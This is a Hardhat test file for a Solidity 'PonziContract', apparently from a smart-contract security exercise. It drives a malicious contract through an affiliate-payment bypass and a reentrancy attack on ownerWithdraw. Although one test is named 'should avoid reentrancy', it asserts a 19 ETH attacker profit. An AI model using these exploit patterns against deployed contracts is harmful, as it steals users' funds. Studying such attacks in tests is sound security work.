import { expect } from 'chai';
import { ethers } from 'hardhat';
import { Contract } from 'ethers';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';

describe('PonziContract', function () {
  let ponziContract: Contract;
  let ponziOwner: SignerWithAddress;

  let attacker: SignerWithAddress;
  let accounts: SignerWithAddress[];

  before(async function () {
    [ponziOwner, attacker, ...accounts] = await ethers.getSigners();

    const PonziContract = await ethers.getContractFactory('PonziContract');
    ponziContract = await PonziContract.connect(ponziOwner).deploy();
    await ponziContract.deployed();

    const newDeadline = Math.floor(Date.now() / 1000) + 3600; // Set the deadline 1 hour from now
    await ponziContract.connect(ponziOwner).setDeadline(newDeadline);
    await ponziContract.connect(ponziOwner).addNewAffilliate(ponziOwner.address);
    await ponziOwner.sendTransaction({
      to: ponziContract.address,
      value: ethers.utils.parseEther('100'),
    });
  });

  it('should send money to affiliates', async () => {
    // Contract has one affiliate
    // Expect to receive 1 eth for every new memeber non added by the owner
    const FreeJoinAttack = await ethers.getContractFactory('MaliciousContract');
    const freeJoinAttack = await FreeJoinAttack.connect(attacker).deploy(ponziContract.address);
    await freeJoinAttack.deployed();

    const attackerInitialBalance = await ethers.provider.getBalance(attacker.address);
    const ponziOwnerInitialBalance = await ethers.provider.getBalance(ponziOwner.address);

    // send ETH to himself instead of older affiliates
    await ponziContract.connect(attacker).joinPonzi([attacker.address], {
      value: ethers.utils.parseEther('1'),
    });

    const attackerCurrentBalance = await ethers.provider.getBalance(attacker.address);

    // Cost will be 1 + gas cost
    console.log('Account1 InitialBalance initial balance: ' + attackerInitialBalance);
    console.log('Account1 CurrentBalance initial balance: ' + attackerCurrentBalance);
    console.log(ethers.utils.formatEther(attackerCurrentBalance.sub(attackerInitialBalance)));

    // Expect to receive 1 ETH from attacker affiliation
    const ponziOwnerCurrentBalance = await ethers.provider.getBalance(ponziOwner.address);
    console.log('Account1 InitialBalance initial balance: ' + ponziOwnerInitialBalance);
    console.log('Account1 CurrentBalance initial balance: ' + ponziOwnerCurrentBalance);
    // Calculate the difference in ETH
    const ownerDifferenceInEth = ethers.utils.formatEther(ponziOwnerCurrentBalance.sub(ponziOwnerInitialBalance));
    expect(ownerDifferenceInEth).to.equal('1.0');
  });

  it('should avoid reentrancy attack in ownerWithdraw', async function () {
    const ReentrancyAttack = await ethers.getContractFactory('MaliciousContract');
    const reentrancyAttack = await ReentrancyAttack.connect(attacker).deploy(ponziContract.address);
    await reentrancyAttack.deployed();

    const attackerInitialBalance = await ethers.provider.getBalance(reentrancyAttack.address);
    console.log('Attacker initial balance: ' + attackerInitialBalance);

    await reentrancyAttack.connect(attacker).startReentrancyAttack({ value: ethers.utils.parseEther('15') });

    const attackerCurrentBalance = await ethers.provider.getBalance(reentrancyAttack.address);
    console.log('Attacker current balance: ' + attackerCurrentBalance);

    // Calculate the difference in ETH
    const differenceInEth = ethers.utils.formatEther(attackerCurrentBalance.sub(attackerInitialBalance));

    // Compare the difference to the expected value (19.0 ETH)
    // 0 + 15 funded by attacker
    // 15 - 1 - 10 affiliating and buying ownership
    // 4 + 15 withdraw funds once
    expect(differenceInEth).to.equal('19.0');
  });
});
